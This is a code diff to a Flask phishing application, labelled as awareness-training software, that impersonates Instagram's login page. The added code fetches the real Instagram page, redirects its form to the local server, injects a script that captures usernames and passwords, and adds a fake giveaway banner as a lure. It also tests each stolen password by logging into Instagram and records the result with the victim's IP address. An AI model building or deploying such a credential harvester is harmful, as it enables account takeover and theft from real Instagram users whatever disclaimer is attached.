@@ -4,10 +4,13 @@ This tool is designed ONLY for cybersecurity awareness training.
 Use only with explicit consent from participants in a controlled environment.
 """
 
-from flask import Flask, render_template, request, redirect, url_for, jsonify
+from flask import Flask, render_template, request, redirect, url_for, jsonify, Response
 from datetime import datetime
 import json
 import os
+import requests
+from bs4 import BeautifulSoup
+import re
 
 app = Flask(__name__)
 
@@ -30,21 +33,172 @@ def save_credentials():
     with open(CREDENTIALS_FILE, 'w') as f:
         json.dump(captured_credentials, f, indent=2)
 
+def fetch_instagram_login_page():
+    """Fetch the actual Instagram login page"""
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        }
+        
+        response = requests.get('https://www.instagram.com/accounts/login/', headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            # Modify form action to point to our server
+            for form in soup.find_all('form'):
+                form['action'] = '/login'
+                form['method'] = 'POST'
+            
+            # Inject our credential capture script
+            script_tag = soup.new_tag('script')
+            script_tag.string = """
+            document.addEventListener('DOMContentLoaded', function() {
+                const forms = document.querySelectorAll('form');
+                forms.forEach(form => {
+                    form.addEventListener('submit', async function(e) {
+                        e.preventDefault();
+                        
+                        const usernameInput = form.querySelector('input[name*="username"], input[type="text"]');
+                        const passwordInput = form.querySelector('input[name*="password"], input[type="password"]');
+                        
+                        if (usernameInput && passwordInput) {
+                            const formData = new URLSearchParams();
+                            formData.append('username', usernameInput.value);
+                            formData.append('password', passwordInput.value);
+                            
+                            try {
+                                const response = await fetch('/login', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/x-www-form-urlencoded',
+                                    },
+                                    body: formData
+                                });
+                                
+                                const data = await response.json();
+                                
+                                if (data.status === 'success') {
+                                    window.location.href = data.redirect;
+                                } else {
+                                    // Show Instagram's error message
+                                    const errorDiv = document.querySelector('[role="alert"], .error-message');
+                                    if (errorDiv) {
+                                        errorDiv.textContent = data.message;
+                                        errorDiv.style.display = 'block';
+                                    } else {
+                                        alert(data.message);
+                                    }
+                                }
+                            } catch (error) {
+                                console.error('Error:', error);
+                            }
+                        }
+                    });
+                });
+            });
+            """
+            
+            if soup.body:
+                soup.body.append(script_tag)
+            
+            # Add promo banner
+            banner_html = """
+            <div style="position: fixed; top: 0; left: 0; right: 0; background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); color: white; padding: 15px; text-align: center; z-index: 10000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+                <h3 style="margin: 0 0 5px 0; font-size: 16px; font-weight: 600;">🎁 Special Instagram Giveaway!</h3>
+                <p style="margin: 0; font-size: 13px; opacity: 0.95;">Login to claim your exclusive prize</p>
+            </div>
+            <div style="height: 80px;"></div>
+            """
+            
+            banner_tag = BeautifulSoup(banner_html, 'html.parser')
+            if soup.body:
+                soup.body.insert(0, banner_tag)
+            
+            return str(soup)
+        else:
+            return None
+            
+    except Exception as e:
+        print(f"Error fetching Instagram page: {e}")
+        return None
+
+def verify_instagram_login(username, password):
+    """
+    Verify Instagram credentials by attempting actual login
+    Returns True if credentials are valid, False otherwise
+    """
+    try:
+        session = requests.Session()
+        
+        # Get Instagram homepage to get CSRF token
+        response = session.get('https://www.instagram.com/')
+        csrf_token = session.cookies.get('csrftoken', '')
+        
+        # Prepare login data
+        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+        timestamp = int(datetime.now().timestamp())
+        
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://www.instagram.com/accounts/login/',
+            'x-csrftoken': csrf_token
+        }
+        
+        payload = {
+            'username': username,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
+            'queryParams': {},
+            'optIntoOneTap': 'false'
+        }
+        
+        # Attempt login
+        login_response = session.post(login_url, data=payload, headers=headers)
+        result = login_response.json()
+        
+        # Check if authenticated
+        if result.get('authenticated') == True or result.get('userId'):
+            return True
+        
+        return False
+        
+    except Exception as e:
+        print(f"Verification error: {e}")
+        # If verification fails (network issues, etc), return False
+        return False
+
 @app.route('/')
 def index():
-    """Fake Instagram login page"""
-    return render_template('instagram_login.html')
+    """Fetch and serve real Instagram login page"""
+    instagram_html = fetch_instagram_login_page()
+    
+    if instagram_html:
+        return Response(instagram_html, mimetype='text/html')
+    else:
+        # Fallback to our custom template
+        return render_template('instagram_login.html')
 
 @app.route('/login', methods=['POST'])
 def login():
-    """Capture credentials and redirect to real Instagram post"""
+    """Capture credentials and verify with Instagram, then redirect"""
     username = request.form.get('username', '')
     password = request.form.get('password', '')
+    
+    # Verify credentials with actual Instagram
+    is_valid = verify_instagram_login(username, password)
     
     # Capture the data with timestamp
     data = {
         'username': username,
         'password': password,
+        'valid': is_valid,
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'ip_address': request.remote_addr,
         'user_agent': request.headers.get('User-Agent', 'Unknown')
@@ -58,14 +212,18 @@ def login():
     print(f"{'='*60}")
     print(f"Username: {username}")
     print(f"Password: {password}")
+    print(f"Valid: {'✅ YES' if is_valid else '❌ NO'}")
     print(f"Time: {data['timestamp']}")
     print(f"IP: {data['ip_address']}")
     print(f"{'='*60}\n")
     
-    # Redirect to real Instagram post (makes it look legitimate!)
-    instagram_post_url = "https://www.instagram.com/p/DQnya2Nkm8i/?hl=en"
-    
-    return redirect(instagram_post_url)
+    if is_valid:
+        # Only redirect if credentials are valid
+        instagram_post_url = "https://www.instagram.com/p/DQnya2Nkm8i/?hl=en"
+        return jsonify({'status': 'success', 'redirect': instagram_post_url})
+    else:
+        # Return error if invalid
+        return jsonify({'status': 'error', 'message': 'Sorry, your password was incorrect. Please double-check your password.'}), 401
 
 @app.route('/reveal')
 def reveal():
